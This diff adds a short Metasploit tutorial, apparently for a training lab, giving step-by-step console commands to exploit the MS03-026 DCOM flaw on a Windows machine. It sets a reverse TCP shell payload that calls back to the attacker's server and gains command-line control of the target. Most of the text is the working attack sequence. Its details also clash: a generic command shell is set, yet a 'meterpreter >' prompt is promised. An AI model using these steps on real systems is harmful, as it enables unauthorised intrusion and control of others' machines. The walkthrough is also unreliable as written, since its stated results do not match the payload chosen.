@@ -1,0 +1,19 @@
+Metasploit Instructions
+There are many exploits that can be used in the Metasploit Framework. Feel free to poke around there and discover some useful ones for yourself. Below are instructions for one in particular, that allows you to connect to a remote host and gain command line access.
+
+Steps:
+
+Launch the Metasploit Framework from your Attack server from the following menu:
+Applications - BackTrack - Exploitation Tools - Network Exploitation Tools - Metasploit Framework - msfconsole
+Once it loads you should be at a msf> prompt
+Type: use windows/dcerpc/ms03_026_dcom
+Hit Enter (Your prompt will change a little, this puts you into the specific exploit you want to use)
+You will next setup the exploit options by typing the following and hitting enter after each statement:
+set RHOST aaa.bbb.ccc.ddd (where aaa.bbb.ccc.ddd is the IP Address of the machine you are attacking)
+set PAYLOAD generic/shell_reverse_tcp (this statement tells the exploit what to do on the target, in this case launch a command line)
+set LHOST aaa.bbb.ccc.dde (where aaa.bbb.ccc.dde is the IP Address of your Linux Attack server)
+show options (this lets you see and make sure your options are set properly)
+exploit (this executes the exploit, and if you set everything properly you should see your prompt look like this: meterpreter > )
+You can verify the current directory by typing "pwd" without the quotes. You should get back: C:\Windows\System32
+You now have control to obtain information from the target machine.
+Type quit to exit out of the target machine and put you back to the msf prompt.
